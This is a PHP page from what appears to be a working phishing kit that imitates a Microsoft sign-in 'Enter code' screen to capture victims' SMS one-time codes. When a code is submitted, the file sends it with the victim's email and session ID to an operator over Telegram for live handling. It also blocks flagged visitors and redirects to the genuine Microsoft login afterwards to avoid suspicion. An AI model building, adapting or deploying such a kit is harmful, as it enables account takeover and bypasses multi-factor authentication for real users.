<?php
// text-code.php — Text message code entry
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid      = $_SESSION['visitor_id'] ?? session_id();
// ── Block check: redirect immediately if visitor is blocked ──
if (!empty($sid)) {
    $__state = get_state($sid);
    if (!empty($__state['blocked'])) {
        header('Location: blocked.php');
        exit;
    }
}

$email    = $_SESSION['email'];
$state    = get_state($sid);
if ($state['page'] === 'success') { header('Location: https://login.microsoftonline.com/'); exit; }

$is_error = ($state['page'] === 'code_error');
$error    = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = trim($_POST['code'] ?? '');
    if ($code === '') {
        $error = 'Enter the code we texted you.';
    } else {
        set_state($sid, ['page' => 'loading']);
        $s = get_state($sid);
        tg_send(
            "💬 <b>TEXT CODE SUBMITTED</b>\n\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔢 Code: <code>{$code}</code>\n\n" .
         
            "👇 <b>What next?</b>"
        );
        tg_after_code($sid, 'sms');
        header('Location: loading.php');
        exit;
    }
}

page_open('Enter code', true);
?>

<div class="card">
  <?= company_logo_html() ?>
  <?= back_email($email) ?>
  <h1 class="card-title">Enter code</h1>

  <div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:20px">
    <div class="verify-option-icon" style="flex-shrink:0;margin-top:2px">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#444" stroke-width="1.5">
        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
      </svg>
    </div>
    <p style="font-size:14px;color:#1b1b1b;line-height:1.6">
      We texted your phone <strong>+X XXXXXXXXXX</strong>. Please enter the code to sign in.
    </p>
  </div>

  <?php if ($is_error && !$error): ?>
    <div class="err-text" style="margin-bottom:10px">
      <?= err_icon() ?> That code didn't work. Try again.
    </div>
  <?php endif; ?>

  <form method="POST" id="codeForm" novalidate>
    <div class="ms-field">
      <input type="text" name="code" id="codeInput"
             placeholder="Code"
             inputmode="numeric" maxlength="8"
             autocomplete="one-time-code"
             class="<?= $error ? 'err' : '' ?>" />
    </div>
    <?php if ($error): ?>
      <div class="err-text"><?= err_icon() ?> <?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="codeErr"></div>
    <?php endif; ?>

    <a href="#" class="ms-link">More information</a>

    <div class="btn-row-ms">
      <button type="submit" class="btn-ms">Verify</button>
    </div>
  </form>
</div>

<?= _poll_script(['text_code','code_error']) ?>
<?php page_close(); ?>